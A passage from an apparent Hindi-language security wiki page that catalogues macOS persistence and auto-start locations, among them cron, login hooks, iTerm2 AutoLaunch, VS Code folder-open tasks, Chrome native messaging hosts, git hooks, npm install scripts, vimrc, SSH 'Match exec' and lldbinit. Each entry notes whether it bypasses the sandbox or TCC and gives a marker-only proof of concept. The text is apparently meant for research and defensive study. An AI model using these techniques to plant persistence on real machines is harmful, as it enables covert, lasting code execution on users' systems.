ये paths legacy `.qlgenerator` bundles को संदर्भित करते हैं; [Apple की Quick Look architecture guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) search order और matching file types का विवरण देती है। मौजूदा Quick Look **app extensions** किसी app के साथ package किए जाते हैं और उनके registration तथा execution के नियम अलग होते हैं। किसी generator का मौजूद होना यह साबित नहीं करता कि type selection में वही चुना जाएगा या उसका code Finder के भीतर ही चलेगा। Legacy generator path की समीक्षा documentation और directory में उसकी मौजूदगी के आधार पर की गई; research Mac पर कोई generator install या load नहीं किया गया था।

### ~~Login/Logout Hooks~~

> [!CAUTION]
> यह मेरे लिए काम नहीं किया—न user LoginHook के साथ, न root LogoutHook के साथ।

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- आपको `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` जैसा कुछ execute कर पाने में सक्षम होना होगा।
  - `Lo` में स्थित `~/Library/Preferences/com.apple.loginwindow.plist`

ये deprecated हैं, लेकिन user के login करने पर commands execute करने के लिए इस्तेमाल किए जा सकते हैं।<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

यह सेटिंग `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में संग्रहीत होती है।

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

इसे हटाने के लिए:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root user वाला यहाँ स्टोर होता है: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगे, जिनकी मदद से आप किसी चीज़ को **फ़ाइल में लिखकर** और **बहुत आम न होने वाली स्थितियों**—जैसे विशिष्ट **programs installed होना, उपयोगकर्ता की "असामान्य" कार्रवाइयाँ** या environments—की अपेक्षा करके उसे आसानी से execute कर सकते हैं।

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - हालाँकि, आपको `crontab` binary execute करने में सक्षम होना होगा
  - या आपके पास root access होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - सीधे write access के लिए root आवश्यक है। अगर आप `crontab <file>` execute कर सकते हैं, तो root आवश्यक नहीं है।
  - **Trigger**: installed crontab में schedule। `at` और `periodic` नीचे अलग mechanisms हैं।

#### Description & Exploitation

इस command से **वर्तमान user** के cron jobs की सूची देखें:

```bash
crontab -l
```

system cron daemon के launchd plist में `/usr/lib/cron/tabs` के लिए `QueueDirectories` entry है; installed user crontabs वहीं रखे जाते हैं। दूसरे users के crontabs की जाँच के लिए root access चाहिए:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

एक disposable account में, `crontab` के साथ केवल marker वाली user cron entry इंस्टॉल की जा सकती है और उसे देखने के बाद हटाया जा सकता है। `crontab <file>` चलाने से account की पूरी मौजूदा crontab **बदल जाती है**, इसलिए यदि account disposable नहीं है, तो उसे सेव करके बाद में restore करें:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 को पहले से TCC permissions मिली हुई थीं

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Trigger**: उस फ़ोल्डर में मौजूद योग्य Python API script के साथ iTerm2 शुरू करें
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Trigger**: iTerm2 शुरू करें; AppleScript startup hook का दस्तावेज़ अलग से दिया गया है
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Trigger**: ऐसा profile चुनकर session बनाएं जिसका command या initial text payload को invoke करता हो

#### Description & Exploitation

[मौजूदा iTerm2 Python API guide](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) `~/Library/Application Support/iTerm2/Scripts/AutoLaunch` में auto-run **Python** scripts का दस्तावेज़ देता है। यह साबित नहीं करता कि उस फ़ोल्डर में मौजूद कोई भी `.sh` executable फ़ाइल चल जाएगी। एक अस्थायी account में, इसे `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py` के रूप में सेव करें:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[वर्तमान iTerm2 AppleScript गाइड](https://iterm2.com/documentation-scripting.html) `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt` को अलग से दस्तावेज़ित करती है। इसमें पुराने `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` का विकल्प भी है, जिसका उपयोग तब किया जाता है जब आधुनिक फ़ोल्डर मौजूद न हो। केवल marker वाला AppleScript इस प्रकार है:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

इन script examples को iTerm2 के documentation के अनुसार जाँचा गया था; इन्हें सक्रिय desktop session में नहीं चलाया गया। Disposable account में परीक्षण करने के बाद, test script और `/tmp/ht-iterm-autolaunch-marker` या `/tmp/iterm2-autolaunchscpt` को हटा दें।

**`~/Library/Preferences/com.googlecode.iterm2.plist`** में स्थित iTerm2 preferences, profile command या initial text निर्दिष्ट कर सकती हैं। बाद वाला session में टाइप किया जाता है; इसका execution इस बात पर निर्भर करता है कि कोई shell इसकी व्याख्या करे। [iTerm2 का profile documentation](https://iterm2.com/documentation-preferences-profiles-general.html) उस command का वर्णन करता है जो उस profile के साथ नया session बनने पर चलती है।

यह setting iTerm2 settings में configure की जा सकती है:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

और command preferences में दिखाई देती है:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

सुरक्षित आकलन के लिए, iTerm2 settings में चुनी गई profile की जाँच करें या उसकी preference file की प्रति पढ़ें। किसी live profile में `Initial Text` बदलने से उपयोगकर्ता के sessions प्रभावित होंगे, इसलिए research Mac पर कोई preference नहीं बदली गई।

### xbar

लेख: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन xbar इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Accessibility permissions का अनुरोध करता है

#### स्थान

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **ट्रिगर**: xbar के निष्पादित होते ही

#### विवरण

अगर लोकप्रिय प्रोग्राम [**xbar**](https://github.com/matryer/xbar) इंस्टॉल है, तो **`~/Library/Application\ Support/xbar/plugins/`** में एक shell script लिखी जा सकती है, जिसे xbar शुरू होने पर निष्पादित किया जाएगा:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Hammerspoon इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Accessibility permissions मांगता है

#### Location

- **`~/.hammerspoon/init.lua`**
  - **Trigger**: Hammerspoon execute होते ही

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) **macOS** के लिए एक automation platform है, जो अपने कामकाज के लिए **LUA scripting language** का उपयोग करता है। विशेष रूप से, यह पूर्ण AppleScript code को integrate करने और shell scripts execute करने का समर्थन करता है, जिससे इसकी scripting capabilities काफी बढ़ जाती हैं।<sup>[[13]](#references)</sup>

ऐप `~/.hammerspoon/init.lua` नाम की एक फ़ाइल खोजता है और शुरू होने पर script execute हो जाएगी।

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन BetterTouchTool इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Automation-Shortcuts और Accessibility permissions मांगता है

#### Location

- कोई script file जिसे पहले से enabled BetterTouchTool preset में **referenced** किया गया हो, या उस preset का configuration `~/Library/Application Support/BetterTouchTool/` में हो। सटीक script path preset को configure किए जाने के तरीके पर निर्भर करता है।

[BetterTouchTool का action reference](https://docs.folivora.ai/docs/actions/action-definitions/) shell-script और background-command actions का दस्तावेज़ देता है। संबंधित preset के active रहने के दौरान configured keyboard, mouse, touch, widget या कोई अन्य event होना चाहिए; [इसकी trigger guide](https://docs.folivora.ai/docs/configuration/new-trigger/) इस pairing को दिखाती है। Application-support directory में कोई random file trigger नहीं होती। पहले से configured ऐसा action जो किसी external writable script को load करता हो, write-to-execution का अधिक सीमित target है। Code BetterTouchTool user के account के रूप में चलता है और macOS grants के अधीन होता है। Research Mac पर `/Applications` में BetterTouchTool मौजूद नहीं था, इसलिए स्थानीय रूप से कोई preset बदला या execute नहीं किया गया।

### Alfred

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Alfred इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Automation, Accessibility और यहां तक कि Full-Disk access permissions भी मांगता है

#### Location

- कोई script या file जिसे पहले से installed Alfred workflow में **referenced** किया गया हो, या वह workflow उपयोगकर्ता की configured `Alfred.alfredpreferences` directory में हो। Preferences directory sync हो सकती है और इसका कोई तय universal path नहीं है।

[Alfred की workflow guide](https://www.alfredapp.com/help/workflows/) Powerpack की prerequisite और इसके UI के ज़रिए installation का विवरण देती है। Installed workflow का hotkey, keyword या कोई अन्य configured trigger fire होना चाहिए; [Alfred का hotkey example](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) एक script action दिखाता है। [Alfred का environment reference](https://www.alfredapp.com/help/workflows/script-environment-variables/) चुने गए preferences path को `alfred_preferences` के रूप में उपलब्ध कराता है। किसी मनमानी directory में unregistered workflow file डालने से यह साबित नहीं होता कि वह install या run होगा। Code signed-in Alfred user के रूप में उसके वास्तविक macOS grants के साथ चलता है। Research Mac पर `/Applications` में Alfred मौजूद नहीं था, इसलिए इस path का आकलन केवल documentation के आधार पर किया गया।

### Raycast Script Commands और extension refresh

- **Write target:** उस directory में executable script जिसे Raycast Settings → Script Commands के अंतर्गत **पहले से जोड़ा गया हो**। Raycast किसी मनमाने नए directory को scan नहीं करता। [Raycast की Script Commands guide](https://manual.raycast.com/script-commands) directory registration का विवरण देती है।
- **Trigger और identity:** उपयोगकर्ता indexed command invoke करता है, configured hotkey या fallback इसे invoke करता है, या Raycast किसी `inline` script को उसके configured `@raycast.refreshTime` पर refresh करता है। Script, Raycast user के रूप में उसके interpreter के ज़रिए चलती है। [Upstream metadata reference](https://github.com/raycast/script-commands#metadata) automatic refresh को केवल inline commands तक सीमित रखता है, और [Raycast का extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) installed `no-view` या `menu-bar` extension commands के लिए अलग से `interval` का समर्थन करता है। केवल एक सामान्य script command जोड़ने से उसका schedule तय नहीं होता।

Registered script directory वाले disposable account के लिए, marker-only inline script यह है:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

इसे पंजीकृत निर्देशिका में सेव करें, executable बनाएं और Raycast को इसे refresh करने दें। फिर उस फ़ाइल और `/tmp/ht-raycast-refresh-marker` को हटा दें। शोध Mac पर Raycast अपने सामान्य `/Applications` नाम के अंतर्गत नहीं मिला, इसलिए यह दस्तावेज़ों पर आधारित है और स्थानीय रूप से नहीं चलाया गया। Accessibility, Automation और फ़ाइल की अनुमतियां अब भी macOS के permission prompts के अधीन हैं।

### Visual Studio Code के स्वचालित workspace tasks

- **लिखने का लक्ष्य:** उस workspace के अंदर `.vscode/tasks.json`, जिसे उपयोगकर्ता खोलेगा।
- **ट्रिगर:** VS Code में उस workspace को खोलना, लेकिन केवल तभी जब फ़ोल्डर trusted हो **और** स्वचालित tasks की अनुमति दी गई हो। Untrusted workspace में स्वचालित tasks कभी नहीं चलते; डिफ़ॉल्ट सेटिंग पहले स्वचालित run से पहले उपयोगकर्ता से अनुमति मांगती है। [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) और [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) इन दोनों शर्तों का वर्णन करते हैं।
- **Execution identity:** कॉन्फ़िगर किए गए task process के ज़रिए VS Code उपयोगकर्ता का account। यह application-specific execution है, login persistence नहीं।

**नए, disposable workspace** में, यह केवल marker लिखने वाला task `.vscode/tasks.json` में रखें:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

विश्वसनीय workspace खोलने और automatic tasks की अनुमति देने के बाद, `.autostart-task-ran` की जाँच करें। सफ़ाई के लिए task entry और marker हटाएँ। **Microsoft के documentation और installed VS Code 1.139.1 bundle के आधार पर इसकी पुष्टि की गई थी; इसे active desktop session में नहीं चलाया गया था।**

### Chrome native messaging hosts

- **लिखने का लक्ष्य:** मौजूदा user के लिए `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`, या सभी users के लिए `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` (admin write की आवश्यकता)। Chromium और Chrome for Testing अलग-अलग directories का उपयोग करते हैं; [Chrome की मौजूदा path table](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location) देखें।
- **ट्रिगर:** `nativeMessaging` permission वाला installed Chrome extension, manifest के सटीक host name का उपयोग करके `chrome.runtime.connectNative()` या `chrome.runtime.sendNativeMessage()` को call करता है। इसके बाद Chrome host executable शुरू करता है। केवल Chrome खोलने से कोई मनमाना नया native host execute नहीं होता; calling extension के बिना manifest बनाने से कुछ नहीं होता। [Chrome की native messaging guide](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) इस handshake का विवरण देती है।
- **Execution identity:** Chrome user का account। Manifest में executable का absolute path होना चाहिए और calling extension origin को स्पष्ट रूप से अनुमति देनी चाहिए।

एक disposable browser account में test extension के साथ, नीचे दी गई files की जोड़ी write-to-execution link दर्शाती है। Manifest का filename उसके `name` से मेल खाना चाहिए, और `TEST_EXTENSION_ID` को उस extension की वास्तविक ID से बदलना होगा:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

इस JSON को `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json` के रूप में सेव करें। manifest के `path` पर मौजूद केवल marker वाला executable इसमें शामिल कर सकता है:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

जब test extension अपने service worker या extension page से `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` कॉल करता है, तो marker साबित करता है कि host शुरू हुआ। यह न्यूनतम host Chrome के length-prefixed response protocol को लागू नहीं करता, इसलिए marker लिखे जाने के बाद extension messaging error दिखा सकता है। सफ़ाई के लिए test manifest, host और marker हटाएँ। macOS 26.5.2 पर Chrome app और दोनों manifest directories मौजूद थे; **active Chrome profile में बदलाव नहीं किया गया और न ही उसका उपयोग करके परीक्षण किया गया**।

### Karabiner-Elements key-event commands

- **लिखने का लक्ष्य:** ऐसे account में `~/.config/karabiner/karabiner.json`, जहाँ Karabiner-Elements इंस्टॉल और चालू हो। [Karabiner की file-location guide](https://karabiner-elements.pqrs.org/docs/json/location/) के अनुसार, app इस file को देखता है और लिखे जाने के बाद उसे reload करता है। `assets/complex_modifications` में मौजूद JSON files केवल import किए जा सकने वाले presets हैं; वहाँ सिर्फ़ file लिखने से कोई rule सक्षम नहीं होता।
- **Trigger:** Rule सक्रिय होने के बाद configured key event। [`to.shell_command` reference](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) command execution का विवरण देता है। यह login पर या हर file write पर code execution नहीं है।
- **Execution identity:** Karabiner की user process चलाने वाला signed-in user। इसके अपने permission grants और कोई भी TCC access, app और version पर निर्भर करते हैं।

एक disposable test account के लिए, `karabiner.json` में चुने गए profile के `complex_modifications.rules` array में यह rule object जोड़ें और profile के बाकी हिस्से को जस का तस रखें। एक harmless marker बनाने के लिए F18 दबाएँ, फिर यह rule और marker हटा दें। F18 चुनने से सामान्य typing key बदलने से बचा जा सकता है:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements macOS 26.5.2 test machine पर `/Applications` में install नहीं था, इसलिए यह स्थानीय runtime परिणाम के बजाय documentation पर आधारित PoC है।

### स्थानीय repository में Git hooks

- **Write target:** `<repo>/.git/hooks/post-checkout` जैसा executable hook। अगर `core.hooksPath` पहले से सेट है, तो उसके बजाय उस configured directory का उपयोग करें। सामान्य tracked source file के रूप में commit किया गया hook clone में अपने-आप install नहीं होता।
- **Trigger:** संबंधित Git operation। उदाहरण के लिए, `post-checkout` `git checkout` या `git switch` के बाद चलता है, और clone या worktree बनाने के बाद भी चल सकता है। [Git की hook reference](https://git-scm.com/docs/githooks) events और executable-bit की requirement बताती है; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) lookup directory बदलता है।
- **Execution identity:** Git चलाने वाला account। Hook तभी execute हो सकता है, जब repository की effective hooks directory actor के लिए writable हो और user बाद में संबंधित Git operation करे।

यह केवल marker बनाने वाला PoC पूरी तरह disposable repository बनाता है, एक hook install करता है और एक branch पर switch करता है। इसे macOS 26.5.2 पर Apple Git 2.50.1 के साथ सफलतापूर्वक चलाया गया था:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### किसी project में npm lifecycle scripts

- **लिखने का लक्ष्य:** किसी writable project के `package.json` में `scripts` map, या किसी installed dependency package का lifecycle script, जिसे user चलाएगा। यह development workflow hook है, किसी directory को खोलने पर होने वाला execution नहीं।
- **ट्रिगर और identity:** बाद में `npm install` या `npm ci` चलाने पर, यदि lifecycle scripts की अनुमति हो, तो `preinstall`, `install` और `postinstall` npm चलाने वाले user के रूप में चलेंगे। सामान्य `npm run <name>` भी matching `pre<name>` और `post<name>` scripts चलाता है। [npm's lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) events की सूची देता है; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) install lifecycle scripts को suppress कर सकता है। Version और policy settings से क्या अनुमति है, यह बदल सकता है, इसलिए target npm version जाँचें।

यह केवल marker वाला PoC एक disposable, खाली directory में local npm के साथ चलाया गया था। यह dependencies download नहीं करता और न ही किसी user के project में बदलाव करता है:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

यह Python interpreter startup files से अलग है: npm को संबंधित install या run action करना होता है, जबकि Python `site` code सामान्य interpreter invocation पर load हो सकता है। इसी तरह, सामान्य `Makefile` targets और build task definitions के लिए user या पहले से configured tool को उस target को invoke करना पड़ता है; ये अलग OS auto-start paths नहीं हैं।

### Vim startup configuration

- **Write target:** उस user के लिए `~/.vimrc` जो Vim launch करेगा (या Vim के initialization order से चुनी गई कोई दूसरी startup file)। [Vim's startup reference](https://vimhelp.org/starting.txt.html) इस file और `VIMINIT`/`EXINIT` overrides का विवरण देता है।
- **Trigger:** इसके बाद Vim का सामान्य start, जो इस configuration को load करता है। Vim का `-u NONE` user vimrc को bypass करता है। यह editor-specific execution है, OS login trigger नहीं।
- **Execution identity:** Vim user का account।

निम्नलिखित isolated PoC macOS के `/usr/bin/vim` पर चलाया गया था; यह Vim की कोई वास्तविक preferences या खुली documents नहीं लिखता:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim का अलग user configuration path `$XDG_CONFIG_HOME/nvim/init.lua` या `init.vim` है, और [startup documentation](https://neovim.io/doc/user/starting/) के अनुसार यह अपनी `plugin/` runtime directories में scripts भी load करता है। macOS 26.5.2 test machine पर Neovim install नहीं था, इसलिए वहाँ इस variant को run नहीं किया गया।

### SSH client configuration commands

- **Write target:** `~/.ssh/config`, या कोई अन्य file जिसे यह पहले से include करती है। यह **client** configuration file है; यह नीचे बताए गए server-side `~/.ssh/rc` से अलग है।
- **Trigger:** `ssh` का कोई matching invocation। Client द्वारा configuration evaluate किए जाने के दौरान `Match exec` एक local command चलाता है, यहाँ तक कि `ssh -G` के लिए भी, जो connect किए बिना configuration print करता है। Client द्वारा matching connection सेट up करने पर `ProxyCommand` चलता है। `LocalCommand` केवल successful connection के बाद चलता है और इसके लिए `PermitLocalCommand yes` आवश्यक है (default `no` है)। इनका timing और prerequisites अलग-अलग हैं; केवल file में लिख देने से ये execute नहीं होते। Upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) देखें।
- **Execution identity:** `ssh` चलाने वाला local user। एक matching host, लागू configuration file, और ज़रूरी connection आवश्यक हैं। `ssh -F` किसी दूसरी configuration file को चुन सकता है।

यह marker-only PoC macOS 26.5.2 पर Apple के SSH client के साथ run किया गया था। `-G`, network connection बनाए बिना या user की असली SSH configuration पढ़े बिना `Match exec` को exercise करता है:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger initialization files

- **लिखने का लक्ष्य:** `~/.lldbinit` या उच्च प्राथमिकता वाली application-specific फ़ाइल, जैसे `~/.lldbinit-lldb`। LLDB debugger शुरू होने पर इनमें से एक फ़ाइल पढ़ता है। डिफ़ॉल्ट रूप से, current-directory `.lldbinit` execute **नहीं** होती; उपयोगकर्ता को `target.load-cwd-lldbinit` enable करना होगा या `--local-lldbinit` पास करना होगा। [LLDB manual](https://lldb.llvm.org/man/lldb.html) देखें।
- **ट्रिगर और पहचान:** उपयोगकर्ता LLDB को `--no-lldbinit` के बिना शुरू करता है; commands उसी उपयोगकर्ता के रूप में चलती हैं। केवल कोई project खोलने से यह नहीं माना जा सकता कि उस project की `.lldbinit` execute होगी।

निम्नलिखित marker-only test, अलग-थलग home और working directory के साथ, macOS 26.5.2 पर LLDB में चलाया गया:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

**GDB** के लिए, [upstream startup documentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) में macOS पर पहले `$HOME/Library/Preferences/gdb/gdbinit` और फिर `~/.gdbinit` का उल्लेख है। वर्तमान डायरेक्टरी की `.gdbinit` फ़ाइल [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html) के अधीन होती है, और `-nx`/`-nh` initialization files को निष्क्रिय करते हैं। टेस्ट Mac पर GDB इंस्टॉल नहीं था, इसलिए इस variant को स्थानीय रूप से नहीं चलाया गया।

### SSHRC

लेख: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन ssh सक्षम होना चाहिए और उसका उपयोग किया जाना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH का उपयोग FDA access पाने के लिए होता है

#### स्थान

- **`~/.ssh/rc`**
  - **ट्रिगर**: ssh के ज़रिए लॉगिन
- **`/etc/ssh/sshrc`**
  - root आवश्यक
  - **ट्रिगर**: ssh के ज़रिए लॉगिन

> [!CAUTION]
> ssh चालू करने के लिए Full Disk Access आवश्यक है:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### विवरण और Exploitation

डिफ़ॉल्ट रूप से, जब तक `/etc/ssh/sshd_config` में `PermitUserRC no` न हो, जब कोई उपयोगकर्ता **SSH के ज़रिए लॉगिन करता है**, तो स्क्रिप्ट **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** निष्पादित की जाएँगी।<sup>[[14]](#references)</sup>

### **Login Items**

विवरण: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको `osascript` को args के साथ निष्पादित करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **Registered login-item helper app:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (आम bundled location)।
  - **Trigger:** Registration से helper तुरंत शुरू हो सकता है; बाद के user logins पर भी यह शुरू होता है, approval के अधीन।
- **Registered bundled agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` या `Contents/Library/LaunchDaemons/<name>.plist`।
  - **Trigger:** अनुमोदित agent registration पर और बाद के logins पर शुरू हो सकता है; अनुमोदित daemon boot पर शुरू होता है। Daemon के लिए admin approval आवश्यक है।

#### विवरण

**System Settings → General → Login Items & Extensions** में, उपयोगकर्ता login और background items की समीक्षा कर सकते हैं। macOS 13 और उसके बाद के संस्करण bundled login items, launch agents और launch daemons को register करने के लिए [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) उपलब्ध कराते हैं। इसके [`register()` का व्यवहार](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) type और approval state के अनुसार अलग-अलग होता है। **किसी app bundle में helper लिखना, नया login item register करने के लिए पर्याप्त नहीं है।** इसके विपरीत, यदि पहले से registered helper executable writable है, तो उसमें बदलाव उसके अगले launch को प्रभावित कर सकता है, बिना नई registration के; पहले वास्तविक path और code-signing checks की पुष्टि करें।

Mac पर bundled helpers खोजने का यह read-only तरीका है; इससे कोई भी helper register या launch नहीं होता:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
